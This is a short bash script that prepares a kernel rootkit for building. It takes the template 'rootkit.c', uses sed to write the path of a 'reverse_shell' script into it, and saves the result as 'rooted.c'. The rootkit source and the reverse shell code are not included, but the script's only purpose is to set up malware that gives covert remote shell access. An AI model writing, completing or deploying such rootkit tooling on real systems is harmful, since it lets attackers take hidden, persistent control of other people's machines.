#!/bin/bash

KERN=$(uname -r)
IN="rootkit.c"
OUT="rooted.c"
BREAK="----------------------------"

echo ""
#Templates to be replaced
WHERE=$(pwd)"/reverse_shell"
ESC_SHELL=$(echo $WHERE | sed -e 's/\//\\\//g')
SHELL_TMP="shell_path"

echo "Adding reverse shell script path to template..."
echo "$WHERE ..."
echo $BREAK
sed -e "s/$SHELL_TMP/$ESC_SHELL/g;" < $IN > $OUT
